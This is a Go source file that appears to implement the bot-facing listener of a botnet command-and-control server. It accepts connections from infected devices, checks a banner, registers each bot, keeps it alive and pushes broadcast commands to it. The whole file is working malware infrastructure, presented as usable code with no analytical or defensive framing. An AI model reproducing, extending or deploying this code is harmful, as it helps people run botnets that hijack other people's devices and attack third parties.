package main

import (
	"log"
	"net"
	"time"
)

// Slave will start the main slave process
func Slave() error {
	listener, err := net.Listen(Options.Templates.Slaves.Protocol, Options.Templates.Slaves.Listener)
	if err != nil {
		return err
	}

	log.Printf("\x1b[48;5;10m\x1b[38;5;16m Success \x1b[0m Bot server started on port > [%s]\r\n", Options.Templates.Slaves.Listener)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go Handle(conn)
	}
}

type Client struct {
	CID     int
	Version byte
	Source  string
	Conn    net.Conn
	Stream  chan []byte
}

// Handle will handle the new possible device connection.
func Handle(conn net.Conn) {
	defer conn.Close()

	time.Sleep(1 * time.Second)
	buffer := make([]byte, 32)
	i, err := conn.Read(buffer)
	if err != nil || i > len(buffer) {
		return
	}

	// Ranges through each block verifying its data
	for pos, block := range Banner {
		if buffer[pos] != block {
			return
		}
	}

	var New *Client = &Client{
		Conn:    conn,
		Stream:  make(chan []byte),
		Source:  "unknown",
		Version: buffer[len(Banner)+1],
	}

	// Checks for a certain block name
	if buffer[len(Banner)+1] > 0 {
		New.Source = string(buffer[len(Banner)+1:])
	}

	AddClient(New)
	defer RemoveClient(New)
	ticker := time.NewTicker(time.Second)
	cancel := make(chan bool)
	conns := 0

	for {
		select {
		case n := <-cancel: // Cancel is triggered when the device connection is closed.
			if !n {
				continue
			}

			return

		case <-ticker.C: // New Check alive command
			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
			if conns > 0 {
				continue
			}

			go func(conn net.Conn) {
				conns++
				defer func() {
					conns--
				}()

				buf := make([]byte, 1)
				conn.SetReadDeadline(time.Now().Add(180 * time.Second))
				if _, err := conn.Read(buf); err != nil {
					cancel <- true
					return
				}
				conn.SetReadDeadline(time.Now().Add(120 * time.Second))
				if _, err := conn.Write(buf); err != nil {
					cancel <- true
					return
				}
			}(conn)

		case broadcast := <-New.Stream: // Send command
			if _, err := conn.Write(broadcast); err != nil {
				return
			}
		}
	}

}
